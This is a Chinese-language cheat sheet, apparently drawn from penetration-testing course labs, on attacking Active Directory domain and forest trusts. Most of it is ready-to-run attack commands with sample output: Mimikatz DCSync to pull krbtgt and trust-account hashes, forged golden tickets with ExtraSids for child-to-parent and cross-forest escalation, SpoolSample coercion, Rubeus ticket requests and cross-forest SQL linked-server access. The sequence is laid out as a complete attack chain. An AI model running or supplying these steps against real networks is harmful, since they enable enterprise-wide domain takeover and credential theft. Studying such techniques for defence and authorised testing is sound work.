# 域森林攻击代码详解

## 1. 域信任枚举

### 使用nltest枚举
```cmd
# 枚举信任的域
nltest /trusted_domains

# 输出示例:
# List of domain trusts:
#     0: CORP1 corp1.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
#     1: PROD prod.corp1.com (NT 5) (Forest: 0) (Primary Domain) (Native)
```

### 使用.NET枚举域信任
```powershell
# 获取当前域的所有信任关系
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# 输出示例:
# SourceName     TargetName   TrustType TrustDirection
# ----------     ----------   --------- --------------
# prod.corp1.com corp1.com  ParentChild  Bidirectional
```

### 使用.NET枚举森林信任
```powershell
# 获取森林信任关系
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

# 输出示例:
# TopLevelNames            : {corp2.com}
# SourceName               : corp1.com
# TargetName               : corp2.com
# TrustType                : Forest
# TrustDirection           : Bidirectional
```

### 使用PowerView枚举
```powershell
# 使用Win32 API枚举
Get-DomainTrust -API

# 使用LDAP枚举
Get-DomainTrust

# 枚举特定域的信任
Get-DomainTrust -Domain corp1.com

# 完整信任映射
Get-DomainTrustMapping
```

## 2. 跨域枚举

### 枚举外部域用户
```powershell
# 枚举corp1.com域的用户
Get-DomainUser -Domain corp1.com

# 枚举corp2.com域的用户
Get-DomainUser -Domain corp2.com
```

### 枚举外部域组
```powershell
# 枚举外部域的组
Get-DomainGroup -Domain corp1.com

# 查找Enterprise Admins
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain corp1.com
```

### 枚举外部组成员
```powershell
# 查找包含外部成员的组
Get-DomainForeignGroupMember -Domain corp2.com

# 输出示例:
# GroupDomain             : corp2.com
# GroupName               : myGroup2
# MemberName              : S-1-5-21-3776646582-2086779273-4091361643-1601
# MemberDistinguishedName : CN=S-1-5-21-...,CN=ForeignSecurityPrincipals,DC=corp2,DC=com

# 转换SID
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-1601
# 输出: PROD\dave
```

## 3. 获取信任密钥

### 使用Mimikatz DCSync获取信任密钥
```
# 获取信任账户的哈希
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:corp1$

# 输出:
# Object RDN           : CORP1$
# SAM Username         : CORP1$
# Account Type         : 30000002 ( TRUST_ACCOUNT )
# Hash NTLM: cf4bc17dff896101da4f3498a68d50f2
```

### 使用Mimikatz获取krbtgt哈希
```
# 获取krbtgt哈希
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt

# 输出:
# SAM Username         : krbtgt
# Hash NTLM: 4b6af2bf64714682eeef64f516a08949
```

## 5. ExtraSids攻击 - 子域到父域

### 创建带ExtraSids的Golden Ticket
```
# 使用Mimikatz创建Golden Ticket
# /user: 任意用户名
# /domain: 当前域
# /sid: 当前域SID
# /krbtgt: 当前域krbtgt哈希
# /sids: 父域Enterprise Admins SID (父域SID-519)

mimikatz # kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt

# 输出:
# User      : h4x
# Domain    : prod.corp1.com (PROD)
# SID       : S-1-5-21-3776646582-2086779273-4091361643
# Extra SIDs: S-1-5-21-1095350385-1831131555-2412080359-519 ;
# Golden ticket for 'h4x @ prod.corp1.com' successfully submitted for current session
```

### 验证访问
```cmd
# 使用PsExec访问父域DC
C:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd

# 验证组成员身份
whoami /groups
# 应该显示 CORP1\Enterprise Admins
```

## 6. 使用打印机漏洞攻击森林

```powershell
# 检查父域DC的打印机服务
```

```powershell

.\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
```

```powershell
# 执行DCSync
mimikatz # lsadump::dcsync /domain:corp1.com /user:corp1\administrator
```

## 7. 森林信任攻击

### 检查SID过滤状态
```powershell
# 查看信任属性
Get-DomainTrust -Domain corp2.com

# 输出:
# TrustAttributes : FOREST_TRANSITIVE
# 或
# TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE (SID History已启用)
```

### 启用SID History (需要目标域管理员)
```cmd
# 在目标域DC上执行
netdom trust corp2.com /d:corp1.com /enablesidhistory:yes
```

### 攻击启用了SID History的森林信任
```powershell
# 查找RID >= 1000的组
Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com

# 输出示例:
# MemberSID : S-1-5-21-4182647938-3943167060-1815963754-1106
# (RID 1106 >= 1000，可以使用)
```

### 创建Golden Ticket攻击森林
```
# 使用非默认组的SID
mimikatz # kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-1831131555-2412080359 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-4182647938-3943167060-1815963754-1106 /ptt

# 访问目标森林
C:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd
```

## 8. 跨森林SQL Server链接

### 枚举SQL Server SPN
```cmd
# 枚举当前域
setspn -T prod -Q MSSQLSvc/*

# 枚举父域
setspn -T corp1 -Q MSSQLSvc/*

# 枚举外部森林
setspn -T corp2.com -Q MSSQLSvc/*
```

### 连接外部森林SQL Server
```csharp
// C#代码连接外部森林SQL Server
String sqlServer = "dc01.corp2.com";
String database = "master";
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

SqlConnection con = new SqlConnection(conString);
con.Open();
Console.WriteLine("Connected to " + sqlServer);
```

### 枚举链接服务器
```csharp
// 枚举链接服务器
String query = "EXEC sp_linkedservers;";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();

while (reader.Read())
{
    Console.WriteLine("Linked SQL server: " + reader[0]);
}
```

### 通过链接服务器跨森林
```csharp
// 检查链接服务器的登录上下文
String query = "SELECT * FROM OPENQUERY(\"DC01.CORP2.COM\", 'SELECT SYSTEM_USER');";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Executing as: " + reader[0]);
// 如果是sa，可以执行命令
```

## 9. 使用Rubeus进行跨域攻击

### 请求跨域TGT
```powershell
# 使用krbtgt哈希请求TGT
.\Rubeus.exe asktgt /user:Administrator /domain:prod.corp1.com /rc4:HASH /nowrap

# 使用TGT请求跨域服务票据
.\Rubeus.exe asktgs /ticket:TGT_BASE64 /service:cifs/rdc01.corp1.com /dc:rdc01.corp1.com /ptt
```

### 创建跨域Golden Ticket
```powershell
# 使用Rubeus创建Golden Ticket
.\Rubeus.exe golden /user:Administrator /domain:prod.corp1.com /sid:PROD_SID /krbtgt:HASH /sids:CORP1_SID-519 /ptt
```

## 10. 完整攻击流程

### 子域到森林根域
```powershell
# 1. 枚举信任
Get-DomainTrust
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# 2. 获取krbtgt哈希 (需要子域DA权限)
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt

# 3. 获取域SID
$childSID = Get-DomainSID
$parentSID = Get-DomainSID -Domain corp1.com

# 4. 创建Golden Ticket
mimikatz # kerberos::golden /user:h4x /domain:prod.corp1.com /sid:$childSID /krbtgt:HASH /sids:$parentSID-519 /ptt

# 5. 访问森林根域DC
dir \\rdc01.corp1.com\c$
PsExec.exe \\rdc01.corp1.com cmd
```

### 跨森林攻击 (需要SID History)
```powershell
# 1. 枚举森林信任
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

# 2. 检查SID过滤状态
Get-DomainTrust -Domain corp2.com

# 3. 查找可利用的组 (RID >= 1000)
Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com

# 4. 获取krbtgt哈希
mimikatz # lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt

# 5. 创建Golden Ticket
mimikatz # kerberos::golden /user:h4x /domain:corp1.com /sid:CORP1_SID /krbtgt:HASH /sids:CORP2_SID-1106 /ptt

# 6. 访问外部森林
PsExec.exe \\dc01.corp2.com cmd
```

## 常用命令速查

| 命令 | 说明 |
|------|------|
| `nltest /trusted_domains` | 枚举信任域 |
| `Get-DomainTrust` | PowerView枚举信任 |
| `Get-DomainTrustMapping` | 完整信任映射 |
| `Get-DomainSID -Domain X` | 获取域SID |
| `Get-DomainForeignGroupMember` | 枚举外部组成员 |
| `lsadump::dcsync /user:krbtgt` | 获取krbtgt哈希 |

| `netdom trust /enablesidhistory:yes` | 启用SID History |

## 重要SID参考

| SID后缀 | 说明 |
|---------|------|
| -500 | Administrator |
| -502 | krbtgt |
| -512 | Domain Admins |
| -519 | Enterprise Admins |
| -544 | Administrators (内置) |
| >= 1000 | 自定义组/用户 |
